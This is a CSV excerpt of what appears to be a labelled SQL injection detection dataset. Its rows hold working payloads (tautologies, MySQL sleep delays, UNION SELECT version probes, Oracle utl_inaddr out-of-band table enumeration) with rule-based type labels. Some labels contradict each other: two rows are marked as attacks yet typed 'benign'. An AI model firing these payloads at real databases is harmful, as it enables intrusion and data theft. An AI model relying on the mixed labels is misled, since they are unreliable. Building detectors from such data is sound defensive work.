row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
570,"admin"" or ""1"" = ""1""#",1,,boolean_blind,generic,0.95,"or ""1"" = ""1"" detected — boolean_blind injection (priority 8) on generic",rule-based
571,"admin"" or 1 = 1--",1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
572,or user like '%,1,,boolean_blind,generic,0.85,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
573,admin' ) or '1' = '1,1,,boolean_blind,generic,0.95,or '1' = '1 detected — boolean_blind injection (priority 8) on generic,rule-based
574,""" or sleep ( __TIME__ ) #",1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
575,"select * from users where id = 1 or "" ) $"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
576,"select * from users where id = 1 or ""?%"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
577,select * from users where id = '1' + $+%$ or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
578,or ''-',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
579,"select * from users where id = '1' union select \.#,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
580,admin' ) or '1' = '1'/*,1,,boolean_blind,generic,0.95,or '1' = '1' detected — boolean_blind injection (priority 8) on generic,rule-based
581,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
582,"select * from users where id = 1 or ""@?"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
583,select * from users where id = 1 <@$ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
584,x' or 1 = 1 or 'x' = 'y,1,,boolean_blind,generic,0.95,"or 1 = 1, or 'x' = 'y, 1 = 1 or detected — boolean_blind injection (priority 8) on generic",rule-based
585,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
586,"select * from users where id = 1 union select 1 $,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
587,) or ( 'x' ) = ( 'x,1,,boolean_blind,generic,0.85,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
588,"select * from users where id = 1 or 1#"" ( union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
589,"select * from users where id = 1.%@ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
590,"select * from users where id = 1 +$+ union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
591,"select * from users where id = '1' union select \.,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
592,"select * from users where id = 1 or 1#""@ union select null,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
593,"select * from users where id = 1 +$+. union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
594,"select * from users where id = 1 +1<@ union select null,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
595,) ) or sleep ( __TIME__ ) = ',1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
596,having 1 = 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
597,select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,"or 1 = 1, 1 = 1 or detected — boolean_blind injection (priority 8) on generic",rule-based
598,"select * from users where id = '1' or @ 1 = 1 union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @ 1 = 1 union select detected — union_based injection (priority 7) on generic",rule-based
599,"select * from users where id = 1 or 1#""; union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
